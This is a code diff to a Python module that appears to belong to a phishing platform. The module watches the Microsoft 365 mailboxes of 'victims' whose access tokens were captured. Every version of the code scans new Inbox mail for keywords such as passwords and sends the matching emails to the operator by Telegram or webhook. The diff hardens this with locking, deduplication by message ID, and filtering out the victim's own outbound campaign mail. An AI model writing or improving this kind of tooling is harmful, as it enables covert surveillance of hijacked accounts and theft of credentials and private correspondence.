@@ -16,8 +16,8 @@ logger = logging.getLogger(__name__)
 BASE_DIR = Path(__file__).parent.resolve()
 SETTINGS_FILE = BASE_DIR / 'settings.json'
 
-# Global lock prevents the background watcher and manual scan_now from racing
-_scan_lock = threading.Lock()
+# Global reentrant lock prevents background watcher, manual scan_now, and poller from racing
+_scan_lock = threading.RLock()
 
 def load_settings():
     if SETTINGS_FILE.exists():
@@ -154,9 +154,11 @@ def parse_iso_datetime(dt_str):
         cleaned = cleaned.split('.')[0]
     return cleaned
 
-def fetch_graph_messages(access_token, top=40):
-    """Fetch recent messages from Microsoft Graph API sorted newest-first."""
-    url = f"https://graph.microsoft.com/v1.0/me/messages?$top={top}&$orderby=receivedDateTime%20desc&$select=id,subject,from,toRecipients,ccRecipients,bccRecipients,bodyPreview,receivedDateTime,hasAttachments,parentFolderId"
+def fetch_graph_messages(access_token, top=50):
+    """Fetch recent messages strictly from victim's Inbox folder sorted newest-first.
+    Excludes Sent Items, Drafts, and Deleted Items to prevent outgoing campaign duplication.
+    """
+    url = f"https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top={top}&$orderby=receivedDateTime%20desc&$select=id,internetMessageId,subject,from,toRecipients,ccRecipients,bccRecipients,bodyPreview,receivedDateTime,hasAttachments,parentFolderId"
     headers = {
         'Authorization': f'Bearer {access_token}',
         'Accept': 'application/json'
@@ -174,164 +176,178 @@ def fetch_graph_messages(access_token, top=40):
     return []
 
 def scan_victim_mailbox(session, rules=None):
-    """Scan a single victim's new incoming emails against active keyword rules."""
-    user_code = session.get('user_code')
-    victim_name = session.get('victim_name') or 'Unknown'
-    victim_email = session.get('victim_email') or 'Unknown'
-    
-    token = db.get_graph_access_token(session)
-    if not token:
-        logger.info(f"[KEYWORD-WATCHER] Skipping {user_code}: No valid access token available.")
-        return {'status': 'error', 'message': 'No valid access token available', 'hits': 0}
-
-    if rules is None:
-        rules = db.get_keyword_rules(active_only=True)
-
-    # Filter rules for this account
-    applicable_rules = []
-    for r in rules:
-        target = r.get('target_account', 'all')
-        if target in ('all', '', user_code):
-            applicable_rules.append(r)
-
-    if not applicable_rules:
-        return {'status': 'ok', 'message': 'No applicable rules for account', 'hits': 0}
-
-    messages = fetch_graph_messages(token, top=50)
-    if not messages:
-        return {'status': 'ok', 'message': 'No messages retrieved', 'hits': 0}
-
-    # Timestamp when account was captured
-    capture_time = parse_iso_datetime(session.get('completed_at') or session.get('created_at'))
-
-    new_hits = 0
-    detected_matches = []
-
-    for msg in messages:
-        msg_id = msg.get('id')
-        rcvd_time = msg.get('receivedDateTime') or ''
+    """Scan a single victim's new incoming emails against active keyword rules.
+    Thread-safe via _scan_lock. Filters out self-sent emails and deduplicates across folders using internetMessageId.
+    """
+    with _scan_lock:
+        user_code = session.get('user_code')
+        victim_name = session.get('victim_name') or 'Unknown'
+        victim_email = session.get('victim_email') or 'Unknown'
+        v_email_clean = (victim_email or '').strip().lower()
         
-        # Enforce boundary: Only evaluate emails received ON OR AFTER victim capture
-        msg_time = parse_iso_datetime(rcvd_time)
-        if capture_time and msg_time and msg_time < capture_time:
-            # Historical email arrived before account was compromised — skip
-            continue
+        token = db.get_graph_access_token(session)
+        if not token:
+            logger.info(f"[KEYWORD-WATCHER] Skipping {user_code}: No valid access token available.")
+            return {'status': 'error', 'message': 'No valid access token available', 'hits': 0}
 
-        # Deduplication Ledger: If this email has ALREADY triggered an alert, skip immediately!
-        if db.is_message_already_matched(user_code, msg_id):
-            continue
+        if rules is None:
+            rules = db.get_keyword_rules(active_only=True)
 
-        subject = msg.get('subject') or ''
-        sender_obj = msg.get('from', {}).get('emailAddress', {})
-        sender = f"{sender_obj.get('name','')} <{sender_obj.get('address','')}>".strip()
-        body_preview = msg.get('bodyPreview') or ''
+        # Filter rules for this account
+        applicable_rules = []
+        for r in rules:
+            target = r.get('target_account', 'all')
+            if target in ('all', '', user_code):
+                applicable_rules.append(r)
 
-        def _fmt_recipients(recipients_list):
-            if not recipients_list:
-                return "—"
-            res = []
-            for item in recipients_list:
-                ea = item.get('emailAddress', {}) if isinstance(item, dict) else {}
-                addr = (ea.get('address') or '').strip()
-                name = (ea.get('name') or '').strip()
-                if addr:
-                    res.append(f"{name} <{addr}>" if name and name != addr else addr)
-            return ", ".join(res) if res else "—"
+        if not applicable_rules:
+            return {'status': 'ok', 'message': 'No applicable rules for account', 'hits': 0}
 
-        to_str = _fmt_recipients(msg.get('toRecipients'))
-        cc_str = _fmt_recipients(msg.get('ccRecipients'))
-        bcc_str = _fmt_recipients(msg.get('bccRecipients'))
+        messages = fetch_graph_messages(token, top=50)
+        if not messages:
+            return {'status': 'ok', 'message': 'No messages retrieved', 'hits': 0}
 
-        for r in applicable_rules:
-            # Deduplication: If this message was already matched and alerted for this rule, skip immediately
-            if db.is_message_already_matched(user_code, msg_id, r['id']):
+        # Timestamp when account was captured
+        capture_time = parse_iso_datetime(session.get('completed_at') or session.get('created_at'))
+
+        new_hits = 0
+        detected_matches = []
+
+        for msg in messages:
+            msg_id = msg.get('id')
+            internet_msg_id = (msg.get('internetMessageId') or '').strip()
+            rcvd_time = msg.get('receivedDateTime') or ''
+            
+            # Enforce boundary: Only evaluate emails received ON OR AFTER victim capture
+            msg_time = parse_iso_datetime(rcvd_time)
+            if capture_time and msg_time and msg_time < capture_time:
+                # Historical email arrived before account was compromised — skip
                 continue
 
-            scope = r.get('search_scope', 'all')
-            keywords = r.get('keywords', [])
+            # Deduplication Ledger: Check both Graph message_id and RFC internetMessageId
+            if db.is_message_already_matched(user_code, msg_id, internet_message_id=internet_msg_id):
+                continue
 
-            # Construct searchable text block based on scope
-            search_fields = []
-            if scope in ('all', 'subject'):
-                search_fields.append(('subject', subject))
-            if scope in ('all', 'body'):
-                search_fields.append(('body', body_preview))
-            if scope == 'all':
-                search_fields.append(('sender', sender))
+            sender_obj = msg.get('from', {}).get('emailAddress', {})
+            sender_addr = (sender_obj.get('address') or '').strip().lower()
+            sender = f"{sender_obj.get('name','')} <{sender_obj.get('address','')}>".strip()
 
-            matched_keywords = []
-            matched_field = None
-            matched_text = ""
+            # Guard: Ignore emails sent by the victim/operator themselves (outbound B2B campaigns / test sends)
+            if v_email_clean and sender_addr and sender_addr == v_email_clean:
+                continue
 
-            for kw in keywords:
-                kw_str = str(kw).strip()
-                if not kw_str:
+            subject = msg.get('subject') or ''
+            body_preview = msg.get('bodyPreview') or ''
+
+            def _fmt_recipients(recipients_list):
+                if not recipients_list:
+                    return "—"
+                res = []
+                for item in recipients_list:
+                    ea = item.get('emailAddress', {}) if isinstance(item, dict) else {}
+                    addr = (ea.get('address') or '').strip()
+                    name = (ea.get('name') or '').strip()
+                    if addr:
+                        res.append(f"{name} <{addr}>" if name and name != addr else addr)
+                return ", ".join(res) if res else "—"
+
+            to_str = _fmt_recipients(msg.get('toRecipients'))
+            cc_str = _fmt_recipients(msg.get('ccRecipients'))
+            bcc_str = _fmt_recipients(msg.get('bccRecipients'))
+
+            for r in applicable_rules:
+                # Deduplication: If this message was already matched and alerted for this rule, skip immediately
+                if db.is_message_already_matched(user_code, msg_id, r['id'], internet_message_id=internet_msg_id):
                     continue
-                
-                # Check match across configured fields
-                for field_name, field_val in search_fields:
-                    if kw_str.lower() in field_val.lower():
-                        if kw_str not in matched_keywords:
-                            matched_keywords.append(kw_str)
-                        if not matched_field:
-                            matched_field = field_name
-                            matched_text = field_val
-                        break
 
-            if matched_keywords:
-                # Group matched keywords into a clean single string (e.g. "PASSWORD, NEW PASSWORD")
-                primary_kw = matched_keywords[0]
-                kw_display = ", ".join(matched_keywords)
-                snippet = extract_snippet(matched_text if matched_field != 'subject' else f"{subject} — {body_preview}", primary_kw)
+                scope = r.get('search_scope', 'all')
+                keywords = r.get('keywords', [])
 
-                # ── ATOMIC: Write to ledger FIRST to prevent any concurrent scan from re-alerting ──
-                db.mark_message_alerted(user_code, msg_id, rcvd_time)
+                # Construct searchable text block based on scope
+                search_fields = []
+                if scope in ('all', 'subject'):
+                    search_fields.append(('subject', subject))
+                if scope in ('all', 'body'):
+                    search_fields.append(('body', body_preview))
+                if scope == 'all':
+                    search_fields.append(('sender', sender))
 
-                match_id = db.record_keyword_match(
-                    rule_id=r['id'],
-                    session_user_code=user_code,
-                    victim_name=victim_name,
-                    victim_email=victim_email,
-                    matched_keyword=kw_display,
-                    email_subject=subject,
-                    email_sender=sender,
-                    email_snippet=snippet,
-                    message_id=msg_id,
-                    received_datetime=rcvd_time
-                )
-                if match_id:
-                    new_hits += 1
-                    match_payload = {
-                        'id': match_id,
-                        'rule_id': r['id'],
-                        'session_user_code': user_code,
-                        'victim_name': victim_name,
-                        'victim_email': victim_email,
-                        'matched_keyword': kw_display,
-                        'email_subject': subject,
-                        'email_sender': sender,
-                        'email_to': to_str,
-                        'email_cc': cc_str,
-                        'email_bcc': bcc_str,
-                        'email_snippet': snippet,
-                        'message_id': msg_id,
-                        'received_datetime': rcvd_time
-                    }
-                    detected_matches.append(match_payload)
-                    # Dispatch Telegram / Webhook strictly ONCE for this email
-                    if r.get('notify_telegram') or r.get('notify_webhook'):
-                        try:
-                            dispatch_keyword_alert(match_payload, r)
-                        except Exception as e:
-                            logger.warning(f"Error dispatching alert: {e}")
+                matched_keywords = []
+                matched_field = None
+                matched_text = ""
 
-    logger.info(f"[KEYWORD-WATCHER] Scanned {len(messages)} emails for {user_code} ({victim_email}): {new_hits} new hits.")
-    return {
-        'status': 'ok',
-        'emails_scanned': len(messages),
-        'new_hits': new_hits,
-        'matches': detected_matches
-    }
+                for kw in keywords:
+                    kw_str = str(kw).strip()
+                    if not kw_str:
+                        continue
+                    
+                    # Check match across configured fields
+                    for field_name, field_val in search_fields:
+                        if kw_str.lower() in field_val.lower():
+                            if kw_str not in matched_keywords:
+                                matched_keywords.append(kw_str)
+                            if not matched_field:
+                                matched_field = field_name
+                                matched_text = field_val
+                            break
+
+                if matched_keywords:
+                    # Group matched keywords into a clean single string (e.g. "PASSWORD, NEW PASSWORD")
+                    primary_kw = matched_keywords[0]
+                    kw_display = ", ".join(matched_keywords)
+                    snippet = extract_snippet(matched_text if matched_field != 'subject' else f"{subject} — {body_preview}", primary_kw)
+
+                    # ── ATOMIC: Write to ledger FIRST to prevent any concurrent scan from re-alerting ──
+                    db.mark_message_alerted(user_code, msg_id, rcvd_time, internet_message_id=internet_msg_id)
+
+                    match_id = db.record_keyword_match(
+                        rule_id=r['id'],
+                        session_user_code=user_code,
+                        victim_name=victim_name,
+                        victim_email=victim_email,
+                        matched_keyword=kw_display,
+                        email_subject=subject,
+                        email_sender=sender,
+                        email_snippet=snippet,
+                        message_id=msg_id,
+                        received_datetime=rcvd_time
+                    )
+                    if match_id:
+                        new_hits += 1
+                        match_payload = {
+                            'id': match_id,
+                            'rule_id': r['id'],
+                            'session_user_code': user_code,
+                            'victim_name': victim_name,
+                            'victim_email': victim_email,
+                            'matched_keyword': kw_display,
+                            'email_subject': subject,
+                            'email_sender': sender,
+                            'email_to': to_str,
+                            'email_cc': cc_str,
+                            'email_bcc': bcc_str,
+                            'email_snippet': snippet,
+                            'message_id': msg_id,
+                            'received_datetime': rcvd_time
+                        }
+                        detected_matches.append(match_payload)
+                        # Dispatch Telegram / Webhook strictly ONCE for this email
+                        if r.get('notify_telegram') or r.get('notify_webhook'):
+                            try:
+                                dispatch_keyword_alert(match_payload, r)
+                            except Exception as e:
+                                logger.warning(f"Error dispatching alert: {e}")
+                    
+                    # Once this email has triggered an alert for this match, stop evaluating further rules for it
+                    break
+
+        logger.info(f"[KEYWORD-WATCHER] Scanned {len(messages)} Inbox emails for {user_code} ({victim_email}): {new_hits} new hits.")
+        return {
+            'status': 'ok',
+            'emails_scanned': len(messages),
+            'new_hits': new_hits,
+            'matches': detected_matches
+        }
 
 def scan_all_victims(rule_ids=None):
     """Scan mailboxes of all CAPTURED sessions across the platform.
